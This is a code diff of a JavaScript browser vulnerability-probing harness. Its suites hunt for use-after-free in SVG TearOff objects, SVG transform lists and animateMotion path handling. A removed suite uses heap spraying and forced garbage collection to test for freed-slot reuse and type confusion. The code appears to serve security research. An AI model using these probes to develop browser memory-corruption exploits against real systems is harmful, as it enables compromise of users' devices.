+  var tStale=timeWrite(function(i){T0.setTranslate(i+77777,i);},'ADR115: STALE SVG TearOff write WITH CSS override',500);
+  if(tStale>0.5){
+    L('★★★ ADR115: STALE SVG TEAROFF ALIVE WITH CSS OVERRIDE!','hit');
+    L('★★★ ADR115: CSS+SVG combined notification path survives removeItem!','hit');
+  }
+
+  // Also test: baseVal vs animVal with CSS
+  var TL_av=g.transform.animVal;
+  L('ADR115: animVal.numberOfItems = '+TL_av.numberOfItems,'info');
+  if(TL_av.numberOfItems!==TL_svg.numberOfItems){
+    L('★★★ ADR115: baseVal.N('+TL_svg.numberOfItems+') != animVal.N('+TL_av.numberOfItems+') with CSS override!','hit');
+  }
+
+  // CSS Typed OM test
+  if(g.attributeStyleMap){
+    try{
+      var CSSTOM_val=g.attributeStyleMap.get('transform');
+      L('ADR115: attributeStyleMap.get(transform) = '+CSSTOM_val,'info');
+    }catch(e){L('ADR115: attributeStyleMap threw: '+e.message,'warn');}
+  } else {
+    L('ADR115: CSS Typed OM not available','info');
+  }
+
+  // getComputedStyle vs SVG attribute
+  var cs=window.getComputedStyle(g);
+  L('ADR115: computed transform = '+cs.transform,'info');
+  L('ADR115: SVG getAttribute transform = '+g.getAttribute('transform').substring(0,60),'info');
+
+  // Clear CSS, check if SVG TL recovers
+  g.style.transform='';
+  L('ADR115: CSS cleared. TL.numberOfItems = '+TL_svg.numberOfItems,'info');
+  var tAfterClear=timeWrite(function(i){T0.setTranslate(i,i);},'ADR115: stale write AFTER CSS cleared',500);
+  if(tAfterClear>0.5){
+    L('★★★ ADR115: STALE TEAROFF ALIVE AFTER CSS CLEARED!','hit');
+  }
+
+  svg.remove();
+};
+
+// ═══════════════════════════════════════════════════════════════
+// ADR116 — CSS Typed OM on SVG element — stale after attr change
+//
+// CSS Typed OM: element.computedStyleMap() and attributeStyleMap
+// give typed access to CSS properties. For SVG elements, the 'transform'
+// computed value includes BOTH CSS and SVG transforms.
+//
+// If we grab a CSSTransformValue from computedStyleMap(), then change
+// the SVG attribute, does the CSSTransformValue become stale?
+// CSSTransformValue.toMatrix() at that point — UAF in the matrix calc?
+//
+// Also: SVGElement.transform property vs CSS transform property.
+// SVGElement.transform.animVal.consolidate() returns a single
+// SVGTransform that represents the consolidated matrix.
+// The consolidated TearOff — does it share C++ memory with the list?
+// After removeItem, is the consolidated TearOff affected?
+// ═══════════════════════════════════════════════════════════════
+suites['ADR116']=function(){
+  L('ADR116: CSS Typed OM + SVGTransform consolidate stale probe','info');
+  var svg=document.createElementNS(SVG_NS,'svg');
+  document.body.appendChild(svg);
+  var g=document.createElementNS(SVG_NS,'g');
+  g.setAttribute('transform','translate(100,50) rotate(45) scale(2)');
+  svg.appendChild(g);
+
+  // Test CSS Typed OM availability
+  var hasCSSOM=(typeof g.computedStyleMap==='function');
+  L('ADR116: computedStyleMap available: '+hasCSSOM,'info');
+  if(hasCSSOM){
+    try{
+      var csm=g.computedStyleMap();
+      var tv=csm.get('transform');
+      L('ADR116: computed transform type: '+(tv?tv.constructor.name:'null'),'info');
+      if(tv&&tv.toMatrix){
+        var m0=tv.toMatrix();
+        L('ADR116: matrix.a='+m0.a.toFixed(4)+' .e='+m0.e.toFixed(4),'info');
+        // Change SVG attr
+        g.setAttribute('transform','translate(9999,8888)');
+        // Stale read of old CSSTransformValue
+        try{
+          var m1=tv.toMatrix();
+          L('ADR116: stale matrix.a='+m1.a.toFixed(4)+' .e='+m1.e.toFixed(4),'info');
+          if(Math.abs(m1.e-100)<1){
+            L('★★★ ADR116: Stale CSSTransformValue reads OLD data (100) after attr change!','hit');
+          } else if(Math.abs(m1.e-9999)<1){
+            L('ADR116: CSSTransformValue live-updated to new attr value (9999)','info');
+          } else {
+            L('ADR116: CSSTransformValue.e='+m1.e+' (unexpected — possible garbage/UAF?)','warn');
+          }
+        }catch(e){L('ADR116: stale toMatrix() threw: '+e.message,'warn');}
+      }
+    }catch(e){L('ADR116: computedStyleMap threw: '+e.message,'warn');}
+  }
+
+  // SVGTransform.consolidate() probe
+  g.setAttribute('transform','translate(100,0) rotate(45) scale(2)');
+  var TL_bv=g.transform.baseVal;
+  var TL_av=g.transform.animVal;
+  L('ADR116: baseVal.N='+TL_bv.numberOfItems+' animVal.N='+TL_av.numberOfItems,'info');
+
+  // consolidate() returns a SINGLE SVGTransform (the product matrix)
+  var T_cons=null;
+  try{
+    T_cons=TL_av.consolidate();
+    if(T_cons){
+      L('ADR116: consolidate() ok. matrix.e='+T_cons.matrix.e.toFixed(4)+' .f='+T_cons.matrix.f.toFixed(4),'info');
+    } else {
+      L('ADR116: consolidate() returned null (empty list)','info');
     }
+  }catch(e){L('ADR116: consolidate() threw: '+e.message,'warn');}
+
+  // Now remove items from baseVal — does consolidated TearOff change?
+  TL_bv.removeItem(0);
+  TL_bv.removeItem(0);
+  L('ADR116: removed 2 items. baseVal.N='+TL_bv.numberOfItems,'info');
+
+  if(T_cons){
+    L('ADR116: T_cons.matrix.e after removeItem: '+T_cons.matrix.e.toFixed(4),'info');
+    var t=timeWrite(function(i){T_cons.setTranslate(i+44444,i);},'ADR116: consolidate TearOff write after baseVal removeItem',500);
+    if(t>0.5){
+      L('★★★ ADR116: CONSOLIDATED TEAROFF ALIVE AFTER BASEVAL MODIFY!','hit');
+    }
+  }
+
+  // Also test: getItem from animVal then clear baseVal
+  var T_av0=null;
+  try{
+    g.setAttribute('transform','translate(111,222) translate(333,444)');
+    T_av0=g.transform.animVal.getItem(0);
+    L('ADR116: T_av0.tx='+T_av0.matrix.e,'info');
+    g.transform.baseVal.clear();
+    L('ADR116: baseVal.clear() done. animVal.N='+g.transform.animVal.numberOfItems,'info');
+    var t2=timeWrite(function(i){T_av0.setTranslate(i+33333,i);},'ADR116: animVal TearOff write after baseVal.clear()',500);
+    if(t2>0.5){
+      L('★★★ ADR116: ANIMVAL TEAROFF ALIVE AFTER BASEVAL CLEAR!','hit');
+    }
+    L('ADR116: T_av0.tx after writes='+T_av0.matrix.e,'info');
+  }catch(e){L('ADR116: animVal test threw: '+e.message,'warn');}
+
+  svg.remove();
+};
+
+// ═══════════════════════════════════════════════════════════════
+// ADR117 — SVGAnimateMotion: remove path element mid-animation
+//
+// SVGAnimateMotion animates an element along a path defined by:
+// a) the 'path' attribute directly on <animateMotion>
+// b) a <mpath> child referencing an external <path> element
+//
+// For (a): the path is stored internally. No external reference to remove.
+// But: if we CHANGE the path attribute mid-animation, does the old
+// path C++ object get freed while the animation is reading it?
+//
+// For (b): the <mpath href="#myPath"> references a <path> element.
+// Remove the <path> mid-animation → <mpath> has a dangling href.
+// The animation tries to sample the motion path → accesses freed path?
+//
+// Attack for (a):
+// 1. Set up animateMotion with a complex path (many points)
+// 2. Grab current motion position (element.getScreenCTM during anim)
+// 3. In rAF: replace the path attribute with a different one
+// 4. Immediately sample getScreenCTM on the target element
+// → If old path was freed and new path is being built simultaneously,
+//    the CTM calculation might read freed memory
+//
+// Also testing: animateMotion + rotate="auto" — auto-rotation requires
+// computing the path tangent. Changing path mid-animation while
+// tangent is being computed = potential race.
+// ═══════════════════════════════════════════════════════════════
+suites['ADR117']=function(){
+  L('ADR117: SVGAnimateMotion — path change mid-animation + CTM probe','info');
+  var svg=document.createElementNS(SVG_NS,'svg');
+  svg.setAttribute('viewBox','0 0 1000 1000');
+  document.body.appendChild(svg);
+
+  var rect=document.createElementNS(SVG_NS,'rect');
+  rect.setAttribute('width','10');rect.setAttribute('height','10');
+  svg.appendChild(rect);
+
+  // Complex path with many bezier curves
+  var longPath='M 0,0 C 100,200 300,-100 500,0 C 700,100 800,300 1000,200 C 800,400 600,600 500,500 C 300,700 100,600 0,500 Z';
+
+  var anim=document.createElementNS(SVG_NS,'animateMotion');
+  anim.setAttribute('path',longPath);
+  anim.setAttribute('dur','5s');
+  anim.setAttribute('repeatCount','indefinite');
+  anim.setAttribute('rotate','auto');// compute tangent each frame
+  rect.appendChild(anim);
+
+  var frame=0;
+  var ctms=[];
+  function tick(){
+    var ctm=rect.getScreenCTM();
+    if(ctm) ctms.push({a:ctm.a.toFixed(4),e:ctm.e.toFixed(2),f:ctm.f.toFixed(2)});
     if(frame===2){
-      // Remove last item from baseVal
-      g.transform.baseVal.removeItem(bvN-1);
-      var newBvN=g.transform.baseVal.numberOfItems;
-      var newAvN=g.transform.animVal.numberOfItems;
-      L('ADR110 f2: after removeItem(last): bv='+newBvN+' av='+newAvN,'info');
+      L('ADR117 f2: CTM before path change: a='+ctm.a.toFixed(4)+' e='+ctm.e.toFixed(2),'info');
+      // Change path to a COMPLETELY different one (fewer points, different shape)
+      var shortPath='M 0,0 L 100,100';
+      anim.setAttribute('path',shortPath);
+      // Immediately after — race with any pending path computation?
+      var ctm2=rect.getScreenCTM();
+      L('ADR117 f2: CTM immediately after path change: a='+ctm2.a.toFixed(4)+' e='+ctm2.e.toFixed(2),'info');
     }
     if(frame===3){
-      // Read T_av4 and T_bv4 — are they still accessible?
-      L('ADR110 f3: T_av4.tx='+T_av4.matrix.e.toFixed(2),'info');
-      L('ADR110 f3: T_bv4.tx='+T_bv4.matrix.e.toFixed(2),'info');
-      // Time stale writes
-      var t0=performance.now();
-      for(var i=0;i<500;i++) T_av4.setTranslate(i+99999, 0);
-      var t1=performance.now();
-      L('ADR110 f3: T_av4 stale write: '+(t1-t0).toFixed(2)+'ms ('+((t1-t0)>0.5?'★ALIVE':'dead')+')','info');
-      var t2=performance.now();
-      for(var i=0;i<500;i++) T_bv4.setTranslate(i+88888, 0);
-      var t3=performance.now();
-      L('ADR110 f3: T_bv4 stale write: '+(t3-t2).toFixed(2)+'ms ('+((t3-t2)>0.5?'★ALIVE':'dead')+')','info');
-      // Check: did our stale write to T_av4 affect animVal list?
-      var avN3=g.transform.animVal.numberOfItems;
-      L('ADR110 f3: animVal length after stale writes: '+avN3,'info');
-      for(var i=0;i<avN3;i++){
-        var t=g.transform.animVal.getItem(i);
-        L('  animVal['+i+'] tx='+t.matrix.e.toFixed(2),'info');
-      }
+      L('ADR117 f3: CTM after path change settled: a='+ctm.a.toFixed(4)+' e='+ctm.e.toFixed(2),'info');
     }
     if(frame===4){
-      L('ADR110 f4: T_av4.tx after all stale writes='+T_av4.matrix.e.toFixed(2),'info');
-      // Check attr
-      L('ADR110 f4: getAttribute: '+g.getAttribute('transform').substring(0,80),'info');
+      // Remove the animateMotion entirely
+      rect.removeChild(anim);
+      // Access rect CTM immediately
+      var ctm3=rect.getScreenCTM();
+      L('ADR117 f4: CTM after anim removed: e='+ctm3.e.toFixed(2)+' f='+ctm3.f.toFixed(2),'info');
+      // Rapid path changes — stress test
+      for(var i=0;i<20;i++){
+        var anim2=document.createElementNS(SVG_NS,'animateMotion');
+        anim2.setAttribute('path','M 0,0 C '+(i*100)+',200 '+(i*50)+',0 1000,0');
+        anim2.setAttribute('dur','1s');
+        anim2.setAttribute('repeatCount','indefinite');
+        anim2.setAttribute('rotate','auto');
+        rect.appendChild(anim2);
+        rect.getScreenCTM();// force CTM recalc with each
+        rect.removeChild(anim2);// remove immediately
+      }
+      L('ADR117 f4: 20 rapid animateMotion add/remove done. No crash.','info');
+    }
+    if(frame===5){
+      L('ADR117 f5: final CTM: e='+ctm.e.toFixed(2)+' f='+ctm.f.toFixed(2),'info');
+      // Check all CTMs for anomalies (NaN, Inf, extreme values)
+      var anomaly=false;
+      for(var i=0;i<ctms.length;i++){
+        var c=ctms[i];
+        if(isNaN(parseFloat(c.a))||isNaN(parseFloat(c.e))||
+           Math.abs(parseFloat(c.e))>1e10||Math.abs(parseFloat(c.f))>1e10){
+          L('★★★ ADR117: ANOMALOUS CTM at frame '+i+': '+JSON.stringify(c),'hit');
+          anomaly=true;
+        }
+      }
+      if(!anomaly) L('ADR117: All '+ctms.length+' CTMs normal. No anomalies.','info');
+      svg.remove();
     }
     frame++;
-    if(frame<6) requestAnimationFrame(tick);
-    else svg.remove();
+    if(frame<=5) requestAnimationFrame(tick);
   }
   requestAnimationFrame(tick);
 };
 
 // ═══════════════════════════════════════════════════════════════
-// ADR111 — SVGPointList setAttributeNS stale → attribute injection
+// ADR118 — SVGAnimateMotion + <mpath> href to removed path element
 //
-// ADR102-A confirmed: setAttributeNS on polygon → SVGPoint TearOff ALIVE (1ms).
-// But ADR102-D: removeItem → SVGPoint dead (0ms). Different from SVGTransformList.
+// <animateMotion><mpath href="#myPath"/></animateMotion>
+// The <mpath> element holds a reference to an external <path>.
+// If we remove the referenced <path> from the DOM mid-animation,
+// the <mpath> has an unresolved href. What does the animation do?
 //
-// So for SVGPointList:
-// - setAttributeNS → TearOff ALIVE
-// - removeItem → TearOff dead
+// More importantly: the C++ object for the path geometry (the
+// PathData or Path object) — is it freed when the <path> element is
+// removed from DOM? If the animation was in the middle of sampling
+// the path (computing a point-at-length during layout), freeing
+// the PathData is a UAF.
 //
-// The setAttributeNS case: after setting new points attribute,
-// does the stale SVGPoint write inject into the new attribute?
+// We can't directly detect a UAF (no crash = no evidence from JS),
+// but we can:
+// 1. Grab a reference to the path's geometry via getTotalLength()
+// 2. Remove the path element
+// 3. Force the animation to sample it (via rAF + getScreenCTM)
+// 4. Check for anomalous CTM values (suggests freed memory was read)
 //
-// Test: exactly like ADR109 but for SVGPointList.
+// Also: mpath href to a <use> element referencing a path — double
+// indirection. Remove the inner path, does the use→mpath chain crash?
 // ═══════════════════════════════════════════════════════════════
-suites['ADR111']=function(){
-  L('ADR111: SVGPointList setAttributeNS stale → attribute injection?','info');
-  var N=10;
-  var svg=document.createElementNS(SVG_NS,'svg');document.body.appendChild(svg);
-  var poly=document.createElementNS(SVG_NS,'polygon');
-  var pts=[];
-  for(var i=0;i<N;i++) pts.push((i*10)+','+(i*5));
-  poly.setAttribute('points',pts.join(' '));
-  svg.appendChild(poly);
+suites['ADR118']=function(){
+  L('ADR118: animateMotion + mpath href to removed path element','info');
+  var svg=document.createElementNS(SVG_NS,'svg');
+  svg.setAttribute('viewBox','0 0 1000 1000');
+  document.body.appendChild(svg);
 
-  var PL=poly.points;
-  var P_A=PL.getItem(0);
-  L('ADR111: initial: '+poly.getAttribute('points').substring(0,60),'info');
-  L('ADR111: P_A = ('+P_A.x+','+P_A.y+')','info');
+  // The motion path element
+  var pathEl=document.createElementNS(SVG_NS,'path');
+  pathEl.setAttribute('id','adr118_path');
+  var complexD='M 0,0 C 200,400 500,-200 700,200 C 900,600 800,800 500,900 C 200,1000 0,700 0,500 Z';
+  pathEl.setAttribute('d',complexD);
+  var defs=document.createElementNS(SVG_NS,'defs');
+  defs.appendChild(pathEl);
+  svg.appendChild(defs);
 
-  // Set new points attribute
-  poly.setAttributeNS(null,'points','100,200 300,400');
-  L('ADR111: after setAttr: '+poly.getAttribute('points'),'info');
-  var PL_new=poly.points;
-  L('ADR111: PL.numberOfItems after setAttr: '+PL.numberOfItems,'info');
-  L('ADR111: PL_new.numberOfItems: '+PL_new.numberOfItems,'info');
+  // Measure path before removal
+  var pathLen=pathEl.getTotalLength();
+  L('ADR118: path.getTotalLength() = '+pathLen.toFixed(2),'info');
 
-  // Stale write via P_A
-  var CANARY=55555;
-  P_A.x=CANARY;
-  P_A.y=CANARY*2;
-  var attrAfterStale=poly.getAttribute('points');
-  L('ADR111: attr after stale P_A.x/y write: '+attrAfterStale,'info');
-  if(attrAfterStale.indexOf(String(CANARY))!==-1){
-    L('★★★ ADR111: CANARY INJECTED into points attribute!','hit');
+  // The animated rect
+  var rect=document.createElementNS(SVG_NS,'rect');
+  rect.setAttribute('width','10');rect.setAttribute('height','10');
+  svg.appendChild(rect);
+
+  // animateMotion with mpath child
+  var anim=document.createElementNS(SVG_NS,'animateMotion');
+  anim.setAttribute('dur','5s');
+  anim.setAttribute('repeatCount','indefinite');
+  anim.setAttribute('rotate','auto');
+  var mpath=document.createElementNS(SVG_NS,'mpath');
+  mpath.setAttributeNS(XLINK_NS,'xlink:href','#adr118_path');
+  anim.appendChild(mpath);
+  rect.appendChild(anim);
+
+  var frame=0;
+  var anomalyCount=0;
+  function tick(){
+    var ctm=rect.getScreenCTM();
+    if(frame===1){
+      L('ADR118 f1: CTM before path removal: e='+ctm.e.toFixed(2)+' f='+ctm.f.toFixed(2),'info');
+      L('ADR118 f1: pathEl.getTotalLength()='+pathEl.getTotalLength().toFixed(2),'info');
+    }
+    if(frame===2){
+      // Remove the path element from defs — mpath href now dead
+      defs.removeChild(pathEl);
+      L('ADR118 f2: path element REMOVED from defs','info');
+      // Force layout immediately — does animation sample freed path?
+      var ctm2=rect.getScreenCTM();
+      L('ADR118 f2: CTM immediately after path removal: e='+ctm2.e.toFixed(2)+' f='+ctm2.f.toFixed(2),'info');
+      if(isNaN(ctm2.e)||Math.abs(ctm2.e)>1e10||isNaN(ctm2.f)||Math.abs(ctm2.f)>1e10){
+        L('★★★ ADR118: ANOMALOUS CTM right after path removal! Possible UAF!','hit');
+        anomalyCount++;
+      }
+      // Try accessing the removed pathEl
+      try{
+        var lenAfter=pathEl.getTotalLength();
+        L('ADR118 f2: removed pathEl.getTotalLength()='+lenAfter.toFixed(2)+' (still accessible!)','info');
+      }catch(e){L('ADR118 f2: pathEl.getTotalLength() threw after removal: '+e.message,'warn');}
+      // Force GC
+      try{var gcA=[];for(var i=0;i<30000;i++)gcA.push(new Uint8Array(512));gcA=null;if(window.gc)window.gc();}catch(e){}
+      // CTM after GC — does freed path data affect animation?
+      var ctm3=rect.getScreenCTM();
+      L('ADR118 f2: CTM after GC: e='+ctm3.e.toFixed(2)+' f='+ctm3.f.toFixed(2),'info');
+      if(isNaN(ctm3.e)||Math.abs(ctm3.e)>1e10){
+        L('★★★ ADR118: ANOMALOUS CTM after GC! UAF confirmed!','hit');
+        anomalyCount++;
+      }
+    }
+    if(frame===3){
+      L('ADR118 f3: CTM after path removal settled: e='+ctm.e.toFixed(2)+' f='+ctm.f.toFixed(2),'info');
+      // Re-add the path element (what happens?)
+      defs.appendChild(pathEl);
+      var ctm4=rect.getScreenCTM();
+      L('ADR118 f3: CTM after path re-added: e='+ctm4.e.toFixed(2)+' f='+ctm4.f.toFixed(2),'info');
+    }
+    if(frame===4){
+      L('ADR118 f4: CTM after path re-added settled: e='+ctm.e.toFixed(2)+' f='+ctm.f.toFixed(2),'info');
+      // Test: remove mpath child from anim (not the path itself)
+      try{
+        anim.removeChild(mpath);
+        L('ADR118 f4: mpath child removed from animateMotion','info');
+        var ctm5=rect.getScreenCTM();
+        L('ADR118 f4: CTM after mpath removed: e='+ctm5.e.toFixed(2)+' f='+ctm5.f.toFixed(2),'info');
+        // mpath still in JS hand, try to access it
+        L('ADR118 f4: mpath.getAttributeNS(xlink,href)='+mpath.getAttributeNS(XLINK_NS,'xlink:href'),'info');
+      }catch(e){L('ADR118 f4: mpath removal threw: '+e.message,'warn');}
+      L('ADR118: anomaly count = '+anomalyCount,'info');
+      if(anomalyCount===0) L('ADR118: No anomalies. path removal gracefully handled.','info');
+      svg.remove();
+    }
+    frame++;
+    if(frame<=4) requestAnimationFrame(tick);
   }
-
-  // Time the stale write
-  var t0=performance.now();
-  for(var i=0;i<500;i++){P_A.x=i+CANARY;P_A.y=i;}
-  var t1=performance.now();
-  L('ADR111: 500 stale writes: '+(t1-t0).toFixed(2)+'ms ('+((t1-t0)>0.5?'★ALIVE':'dead')+')','info');
-
-  // Final attr check
-  L('ADR111: final attr: '+poly.getAttribute('points'),'info');
-  svg.remove();
+  requestAnimationFrame(tick);
 };
 
 // ═══════════════════════════════════════════════════════════════
-// ADR112 — SVGTransformList: IsoHeap slot reuse test
+// ADR119 — SVGAnimatedRect (viewBox) stale TearOff probe
 //
-// For SVGNumberList on iOS 26.5.2, IsoHeap is bump-only — freed slots
-// are permanently dead. v70 confirmed this.
+// svg.viewBox is an SVGAnimatedRect.
+// svg.viewBox.baseVal is an SVGRect (not a list — single object).
+// svg.viewBox.animVal is the animated version.
 //
-// SVGTransform is a LARGER object than SVGNumber (6 floats vs 1).
-// It may be in a different IsoHeap class (different size bucket).
-// Does SVGTransform's IsoHeap ALSO use bump-only allocation?
+// SVGRect has x, y, width, height properties.
+// The TearOff pattern: SVGRect has a TearOff just like SVGTransform.
 //
-// If NOT bump-only: freed SVGTransform slots can be reused!
-// This would mean after removeItem(0), if T_E holds the last ref to T0
-// and we release T_E, T0's IsoHeap slot becomes available.
-// We could then allocate a new SVGTransform that lands in that slot,
-// while any OTHER TearOff that still refs T0 (an aliased TearOff)
-// would now read our new SVGTransform's data. CLASSIC TYPE CONFUSION.
+// Attack:
+// 1. Grab R_bv = svg.viewBox.baseVal (SVGRect TearOff)
+// 2. Grab R_av = svg.viewBox.animVal (SVGRect TearOff)
+// 3. Add SMIL <animate> targeting viewBox → animVal diverges from baseVal
+// 4. Remove the svg from DOM (remove parent)
+// 5. Time writes to R_bv and R_av — does either survive?
 //
-// Test:
-// 1. Create N SVGTransformLists, each with K transforms
-// 2. Grab TearOffs for ALL items
-// 3. removeItem + release TearOff from all lists → frees N*K SVGTransform slots
-// 4. Create new SVGTransformLists (sprays new SVGTransforms)
-// 5. Check stale TearOffs from step 2 — do any show data from the NEW sprays?
+// Also: SVGRect has x, y, width, height as direct writable properties.
+// After the SVG element is removed from DOM, does the TearOff context
+// remain alive?
 //
-// Also test: createSVGTransform() → is this in the same IsoHeap class?
-// SVGSVGElement.createSVGTransform() creates a standalone SVGTransform.
-// If standalone and list-held SVGTransforms share the same IsoHeap class:
-// freed list slots can be reused by createSVGTransform() calls.
+// Additionally: what about SVGLength TearOff from SVG presentational
+// attributes that are NOT in a list?
+// e.g., rect.width.baseVal → SVGAnimatedLength.baseVal = SVGLength TearOff
+// Remove the rect → SVGLength TearOff stale write → alive?
 // ═══════════════════════════════════════════════════════════════
-suites['ADR112']=function(){
-  L('ADR112: SVGTransformList IsoHeap slot reuse test','info');
-  var svg=document.createElementNS(SVG_NS,'svg');document.body.appendChild(svg);
-  var LISTS=50;
-  var K=10;// transforms per list
+suites['ADR119']=function(){
+  L('ADR119: SVGAnimatedRect (viewBox) + SVGAnimatedLength stale TearOff','info');
+  var svg=document.createElementNS(SVG_NS,'svg');
+  svg.setAttribute('viewBox','0 0 1000 1000');
+  svg.setAttribute('width','200');
+  svg.setAttribute('height','200');
+  document.body.appendChild(svg);
 
-  // Phase 1: Create LISTS lists, grab ALL TearOffs
-  var lists=[];
-  var tearoffs=[];
-  for(var l=0;l<LISTS;l++){
-    var g=document.createElementNS(SVG_NS,'g');
-    var transforms=[];
-    for(var k=0;k<K;k++) transforms.push('translate('+(l*1000+k*10)+','+(l*100+k)+')');
-    g.setAttribute('transform',transforms.join(' '));
-    svg.appendChild(g);
-    var TL=g.transform.baseVal;
-    var row=[];
-    for(var k=0;k<K;k++) row.push(TL.getItem(k));
-    lists.push({g:g,TL:TL});
-    tearoffs.push(row);
-  }
-  L('ADR112: created '+LISTS+' lists × '+K+' items = '+(LISTS*K)+' TearOffs','info');
+  // Grab viewBox TearOffs
+  var R_bv=svg.viewBox.baseVal;
+  var R_av=svg.viewBox.animVal;
+  L('ADR119: R_bv.x='+R_bv.x+' .y='+R_bv.y+' .w='+R_bv.width+' .h='+R_bv.height,'info');
+  L('ADR119: R_av.x='+R_av.x,'info');
 
-  // Phase 2: removeItem ALL items from all lists → free SVGTransform refs from vectors
-  // TearOffs still hold a ref → SVGTransforms NOT freed yet
-  for(var l=0;l<LISTS;l++){
-    var TL=lists[l].TL;
-    for(var k=K-1;k>=0;k--){
-      try{TL.removeItem(k);}catch(e){}
+  // Add SMIL animate targeting viewBox
+  var anim=document.createElementNS(SVG_NS,'animate');
+  anim.setAttribute('attributeName','viewBox');
+  anim.setAttribute('from','0 0 1000 1000');
+  anim.setAttribute('to','500 500 500 500');
+  anim.setAttribute('dur','10s');
+  anim.setAttribute('repeatCount','indefinite');
+  svg.appendChild(anim);
+
+  // Wait one frame for animation to start, then measure
+  requestAnimationFrame(function(){
+    L('ADR119 f1: R_bv.x='+R_bv.x+' R_av.x='+R_av.x,'info');
+    if(R_bv.x!==R_av.x){
+      L('★★★ ADR119: baseVal.x('+R_bv.x+') != animVal.x('+R_av.x+')! SMIL animated viewBox divergence!','hit');
     }
-  }
-  L('ADR112: removeItem done. All lists now empty (items removed from vectors).','info');
 
-  // Phase 3: Release TearOffs → SVGTransform refcount drops to 0 → FREED
-  // We release by overwriting the tearoffs array
-  // Keep ONE TearOff (tearoffs[0][0]) to check for contamination later
-  var sentinel=tearoffs[0][0];
-  var sentinelOrigTx=sentinel.matrix.e;
-  L('ADR112: sentinel = tearoffs[0][0], original tx='+sentinelOrigTx,'info');
+    // Baseline write timing
+    var tBase=timeWrite(function(i){R_bv.width=500+i;},'ADR119: baseline R_bv.width write',500);
 
-  // Release all TearOffs except sentinel
-  for(var l=0;l<LISTS;l++){
-    for(var k=0;k<K;k++){
-      if(!(l===0&&k===0)) tearoffs[l][k]=null;
+    // Remove svg from DOM
+    svg.remove();
+    L('ADR119: svg removed from DOM','info');
+
+    // Stale writes to viewBox TearOffs
+    var t_bv=timeWrite(function(i){R_bv.x=i;R_bv.y=i;R_bv.width=i+100;R_bv.height=i+100;},'ADR119: R_bv stale write after svg remove',500);
+    if(t_bv>0.5){
+      L('★★★ ADR119: R_bv (viewBox baseVal) ALIVE after svg remove!','hit');
     }
-  }
-  tearoffs=null;
 
-  // Force GC
-  try{
-    if(window.gc) window.gc();
-    var gcArr=[];
-    for(var i=0;i<100000;i++) gcArr.push(new Uint32Array(128));
-    gcArr=null;
-    if(window.gc) window.gc();
-  }catch(e){}
-  L('ADR112: GC pressure applied. SVGTransform slots should be freed.','info');
-
-  // Phase 4: Spray new SVGTransforms
-  // Use createSVGTransform() to allocate new SVGTransform objects
-  // These MIGHT land in the freed IsoHeap slots
-  var SPRAY_N=LISTS*K*2;
-  var spray=[];
-  var SPRAY_CANARY=0xDEAD;// decimal: 57005
-  for(var i=0;i<SPRAY_N;i++){
-    var t=svg.createSVGTransform();
-    t.setTranslate(SPRAY_CANARY+i, SPRAY_CANARY*2+i);
-    spray.push(t);
-  }
-  L('ADR112: sprayed '+SPRAY_N+' new SVGTransforms via createSVGTransform()','info');
-
-  // Phase 5: Check sentinel — does it show spray canary data?
-  var sentinelPostTx=sentinel.matrix.e;
-  var sentinelPostTy=sentinel.matrix.f;
-  L('ADR112: sentinel after spray: tx='+sentinelPostTx.toFixed(2)+' ty='+sentinelPostTy.toFixed(2),'info');
-  L('ADR112: sentinel original:    tx='+sentinelOrigTx.toFixed(2),'info');
-  if(Math.abs(sentinelPostTx-sentinelOrigTx)>1){
-    L('★★★ ADR112: SENTINEL CHANGED! IsoHeap slot was REUSED!','hit');
-    L('ADR112: new tx='+sentinelPostTx+' (spray canary range: '+SPRAY_CANARY+'-'+(SPRAY_CANARY+SPRAY_N)+')','hit');
-    var isSprayCanary=sentinelPostTx>=SPRAY_CANARY&&sentinelPostTx<=SPRAY_CANARY+SPRAY_N;
-    if(isSprayCanary){
-      L('★★★ ADR112: Sentinel reads SPRAY DATA → TYPE CONFUSION / UAF via slot reuse!','hit');
+    var t_av=timeWrite(function(i){R_av.x=i+9999;},'ADR119: R_av stale write after svg remove',500);
+    if(t_av>0.5){
+      L('★★★ ADR119: R_av (viewBox animVal) ALIVE after svg remove!','hit');
     }
-  } else {
-    L('ADR112: sentinel unchanged. IsoHeap is bump-only for SVGTransform too.','info');
-  }
 
-  // Also: time stale writes on sentinel
-  var t0=performance.now();
-  for(var i=0;i<500;i++) sentinel.setTranslate(i,i);
-  var t1=performance.now();
-  L('ADR112: sentinel stale write timing: '+(t1-t0).toFixed(2)+'ms','info');
+    // SVGAnimatedLength probe (separate SVGRect-like TearOff)
+    var svg2=document.createElementNS(SVG_NS,'svg');document.body.appendChild(svg2);
+    var r=document.createElementNS(SVG_NS,'rect');
+    r.setAttribute('x','0');r.setAttribute('y','0');
+    r.setAttribute('width','100');r.setAttribute('height','50');
+    svg2.appendChild(r);
 
-  // Phase 6: Spray via insertItemBefore (list-allocated SVGTransform)
-  // createSVGTransform might be a different allocation path than list items
-  var g2=document.createElementNS(SVG_NS,'g');
-  g2.setAttribute('transform','translate(0,0)');
-  svg.appendChild(g2);
-  var TL2=g2.transform.baseVal;
-  var sentinel2=TL2.getItem(0);
-  var sent2Orig=sentinel2.matrix.e;
-  L('ADR112: sentinel2 = list-allocated SVGTransform, orig tx='+sent2Orig,'info');
-  TL2.removeItem(0);// remove from list (slot freed when sentinel2 released)
+    // Grab SVGAnimatedLength TearOffs (non-list SVGLength)
+    var W_bv=r.width.baseVal;// SVGLength TearOff (non-list, single value)
+    var H_bv=r.height.baseVal;
+    L('ADR119: rect W_bv.value='+W_bv.value+' H_bv.value='+H_bv.value,'info');
 
-  // Now re-spray via list insertions
-  var SPRAY2_CANARY=0xBEEF;// 48879
-  for(var i=0;i<LISTS;i++){
-    var g3=document.createElementNS(SVG_NS,'g');
-    g3.setAttribute('transform','translate('+(SPRAY2_CANARY+i)+',0)');
-    svg.appendChild(g3);
-  }
-  L('ADR112: re-sprayed '+LISTS+' list SVGTransforms with canary '+SPRAY2_CANARY,'info');
+    // Baseline
+    var tW=timeWrite(function(i){W_bv.value=i+50;},'ADR119: baseline W_bv.value write',500);
 
-  var sent2Post=sentinel2.matrix.e;
-  L('ADR112: sentinel2 after spray: tx='+sent2Post.toFixed(2),'info');
-  if(Math.abs(sent2Post-sent2Orig)>1){
-    L('★★★ ADR112: SENTINEL2 CHANGED! List-SVGTransform IsoHeap reused!','hit');
-  } else {
-    L('ADR112: sentinel2 unchanged. List SVGTransform IsoHeap also bump-only.','info');
-  }
+    // Remove rect
+    svg2.removeChild(r);
+    L('ADR119: rect removed from svg2','info');
 
-  svg.remove();
-  L('ADR112: done.','info');
